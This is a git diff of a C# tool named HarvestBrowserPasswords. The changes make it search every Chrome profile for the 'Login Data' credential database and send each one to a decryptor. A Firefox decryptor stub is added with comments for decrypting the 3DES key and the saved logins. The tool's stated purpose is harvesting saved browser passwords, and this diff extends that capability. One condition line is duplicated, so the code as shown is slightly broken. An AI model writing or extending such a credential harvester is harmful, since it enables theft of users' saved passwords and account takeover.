@@ -16,12 +16,10 @@ namespace HarvestBrowserPasswords
             //Get username of current user account
             string userAccountName = GetCurrentUser();
 
-            bool verbose = false;
-
             //Parse command line arguments
             if (args.Contains("-v"))
             {
-                verbose = true;
+                
             }
             if (args.Contains("-a"))
             {
@@ -40,10 +38,6 @@ namespace HarvestBrowserPasswords
             {
                 DisplayHelpMessage();
             }
-
-            Console.Write("Press any Key to Quit:\n$>");
-            Console.ReadLine();
-
         }
 
         //Check if currently running in administrator context
@@ -57,11 +51,15 @@ namespace HarvestBrowserPasswords
         public static void GetChromePasswords(string userAccountName)
         {
             List<string> chromeProfiles = FindChromeProfiles(userAccountName);
-            string loginDataFile = $"C:\\Users\\{userAccountName}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
-            if (File.Exists(loginDataFile))
+
+            foreach (string chromeProfile in chromeProfiles)
             {
-                Console.WriteLine($"[+] Found Chrome credential database for user: {userAccountName}");
-                new ChromeDatabaseDecryptor(loginDataFile);
+                string loginDataFile = chromeProfile + @"\Login Data";
+                if (File.Exists(loginDataFile))
+                {
+                    Console.WriteLine($"[+] Found Chrome credential database for user: {userAccountName}");
+                    new ChromeDatabaseDecryptor(loginDataFile);
+                }
             }
         }
 
@@ -76,6 +74,7 @@ namespace HarvestBrowserPasswords
             }
 
             if (Directory.Exists(chromeDirectory))
+            if (Directory.Exists(chromeDirectory))
             {
                 //Add default profile location once existence of chrome directory is confirmed
                 profileDirectories.Add(chromeDirectory + "\\Default");
@@ -84,7 +83,7 @@ namespace HarvestBrowserPasswords
                     if (directory.Contains("Profile "))
                     {
                         profileDirectories.Add(directory);
-                        //Console.WriteLine($"[+] Found Chrome Profile at {directory}");
+                        Console.WriteLine($"[+] Found Chrome Profile at {directory}");
                     }
                 }
             }
@@ -95,8 +94,13 @@ namespace HarvestBrowserPasswords
         {
             foreach (string profile in FindFirefoxProfiles(userAccountName))
             {
-                new FirefoxDatabaseDecryptor(profile);
-                //decryptor.GetSQLiteLogins();
+                FirefoxDatabaseDecryptor decryptor = new FirefoxDatabaseDecryptor(profile);
+                
+                //Conduct Password check
+
+                //Decrypt 3DES key
+
+                //Decrypt Logins
             }
         }
 
